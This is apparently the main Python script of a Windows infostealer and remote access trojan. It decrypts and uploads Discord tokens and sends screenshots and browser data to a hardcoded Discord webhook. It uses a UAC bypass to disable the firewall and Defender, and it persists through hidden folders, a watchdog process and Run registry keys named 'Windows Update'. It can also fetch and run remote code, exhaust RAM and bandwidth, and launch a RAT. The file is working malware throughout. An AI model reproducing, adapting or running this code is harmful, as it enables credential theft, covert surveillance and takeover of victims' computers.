import os
import requests
import subprocess
import time
import threading
import winreg
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from sys import argv
import asyncio
from Crypto.Cipher import AES
import httpx
import json
import socket
import shutil
import tempfile
import sys
import discord
import discordc
import re
import win32con
import ctypes
import webbrowser
from json import loads as json_loads
from discord.ext import commands
import psutil
from sysinf import send_device_information   
from config import Config
from _webhook import _WebhookX
from PIL import ImageGrab
from dhooks import Embed
from dhooks import File
from datetime import datetime
from win32crypt import CryptUnprotectData
from _random_string import get_random_string
from browser import Browsers
from uacbypass import GetSelf, IsAdmin, UACbypass
import drat
import logging


""""
except Exception as e:
    print(e)
    import time
    import os
    import sys
    input("Found missing modules. Press enter to install them.")
    print("Installing missing modules in 3 seconds. CTRL + C to cancel.")
    time.sleep(3.0)
    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install discord")
    os.system("cls")
    print("Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds.")
    time.sleep(10)
    sys.exit

"""    

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
CONTROL_SERVER = "https://api.zitemaker.epicgamer.org"
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
COMMAND_PREFIX = "!"
intents = discord.Intents.default()
intents.message_content = True

connected_clients = {}
ram_eater_active = False
bandwidth_eater_active = False
running_commands = []
cc = Config()
main_path = os.path.join(os.getenv("APPDATA"), 'republicofwadiya')
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()
webhook = cc.get_webhook()
Threadlist = []
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
roaming = os.getenv("APPDATA")
hostname = socket.gethostname()
HIDDEN_DIR = "C:\\ProgramData\\System32Backup"

if not os.path.exists(main_path):
    try:
        os.mkdir(main_path)
    except Exception as e:
        print(e)

def send_error_notification(exception, type):
    webx = _WebhookX().get_object()

    embed = Embed(
        title='WIA Report',
        description='Citadel Instance - Error',
        color=eb_color,
        timestamp=datetime.now().isoformat()
    )

    embed.set_author(name=wh_name, icon_url=wh_avatar)
    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
    embed.add_field(name=f"Error in {type} occured | Fcuk pogy", value=f'`{exception}`', inline=False)

    webx.send(embed=embed)

def debug(message):
    print(f"[DEBUG] {message}")




def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")        


#check_for_updates()


# ram eater
def eat_ram():
    global ram_eater_active
    debug("Starting RAM consumption...")
    try:
        x = []
        while ram_eater_active:
            x.append(bytearray(100000000))
            time.sleep(0.5)
    except MemoryError:
        debug("RAM consumption stopped due to memory error.")
    except Exception as e:
        debug(f"Error in eat_ram: {e}")
    finally:
        ram_eater_active = False


# internet eater
def eat_bandwidth():
    global bandwidth_eater_active
    debug("Starting bandwidth consumption...")
    while bandwidth_eater_active:
        try:
            requests.get("http://speedtest.tele2.net/10GB.zip")
        except Exception as e:
            debug(f"Error in eat_bandwidth: {e}")
        time.sleep(1)



def is_running(process_name):
    """Check if a process is already running."""
    for proc in psutil.process_iter(attrs=['cmdline']):
        try:
            if proc.info['cmdline'] and process_name in " ".join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

def move_to_hidden_directory():
    """Move the script to the hidden directory and restart from there."""
    if not os.path.abspath(__file__).startswith(HIDDEN_DIR):
        print(f"[INFO] Moving script to hidden directory: {HIDDEN_DIR}")
        os.makedirs(HIDDEN_DIR, exist_ok=True)


        script_dir = os.path.dirname(os.path.abspath(__file__))
        for filename in os.listdir(script_dir):
            source_path = os.path.join(script_dir, filename)
            dest_path = os.path.join(HIDDEN_DIR, filename)
            if os.path.isfile(source_path):
                shutil.copy2(source_path, dest_path)

        subprocess.run(["attrib", "+H", "+S", HIDDEN_DIR], shell=True)


        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))

        print("[INFO] Restarting from hidden directory...")
        subprocess.Popen([pythonw_path, hidden_script_path], creationflags=subprocess.DETACHED_PROCESS)
        sys.exit()

def add_to_startup():
    """Add the script to startup registry keys."""
    try:
        print("[INFO] Adding to startup registry...")

        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))
        system32_path = os.path.join(HIDDEN_DIR, "system32.py")

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{pythonw_path}" "{hidden_script_path}"')
            winreg.SetValueEx(registry_key, "System32", 0, winreg.REG_SZ, f'"{pythonw_path}" "{system32_path}"')

        print("[SUCCESS] Registry keys updated successfully.")

    except Exception as e:
        print(f"[ERROR] Failed to add to startup: {e}")

def ensure_watchdog():
    """Ensure `system32.py` is always running."""
    watchdog_script = os.path.join(HIDDEN_DIR, "system32.py")

    if not is_running("system32.py"):
        print("[!] Watchdog is not running. Starting it now...")
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, watchdog_script], creationflags=subprocess.DETACHED_PROCESS)






# gaming
def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token)))
        if response.getcode() == 200:
            return loads(response.read().decode())
        else:
            debug(f"Invalid token: {token}")
            return None
    except Exception as e:
        debug(f"Error getting user data: {e}")
        return None

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}") :
                    for token in findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        debug(f"Error getting tokens: {e}")
    return tokens

def whoTheFuckAmI():
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        debug(f"IP address: {ip}")
        return ip
    except Exception as e:
        debug(f"Error getting IP: {e}")
        return "None"

def hWiD():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        debug(f"HWID: {hwid}")
        return hwid
    except Exception as e:
        debug(f"Error getting HWID: {e}")
        return "None"

def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper




if cc.get_uac_bypass():
    try:
        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass():
                    subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
                    subprocess.run(r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
    except Exception as e:
        send_error_notification(e, 'Wadiyan UAC Bypass')        

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts in ("v10", "v11"):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

Tokens = ""
dclass = discordc.DiscordX()

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    print(path, master_key)

    for file in os.listdir(pathC):
        print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(
                            tokenDecoded) and tokenDecoded not in Tokens:
                        print(token)
                        Tokens += tokenDecoded
                        # writeforfile(Tokens, 'tokens')
                        dclass.uploadToken(tokenDecoded)

def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token) and token not in Tokens:
                            Tokens += token
                            dclass.uploadToken(token)

discordPaths = [
    [f"{roaming}/Discord", "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
]

if cc.get_token_stealing():
    for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)    



if cc.get_screenshot():
    try:
        rndm_strr = get_random_string(5)
        path = os.path.join(main_path, f"screenshot_{rndm_strr}.png")
        screenshot = ImageGrab.grab()        
        screenshot.save(path)
        
        webx = _WebhookX().get_object()

        embed = Embed(
            title='WIA Report',
            description='Citadel Instance - Screenshot',
            color=eb_color,
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=wh_name, icon_url=wh_avatar)
        embed.set_footer(text=eb_footer, icon_url=wh_avatar)

        file = File(path, name='screenshot.png')

        embed.set_image(url=f"attachment://screenshot.png")
        
        webx.send(embed=embed, file=file)
        
        os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Wadiyan Screenshot Stealer')


if cc.get_browser_stealing():
    try:
        browsers = Browsers(webhook)
    except Exception as e:
        send_error_notification(e, 'Wadiyan Browser Stealer')    


move_to_hidden_directory()
ensure_watchdog()
add_to_startup()
send_device_information()
drat.run_rat()


"""
async def main():
    debug("Starting main function...")
    
    add_to_startup()
    #run_in_background()
    loop.create_task(start_bot())
    loop.create_task(send_device_information())

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    loop.run_until_complete(main())
    loop.run_forever()

"""
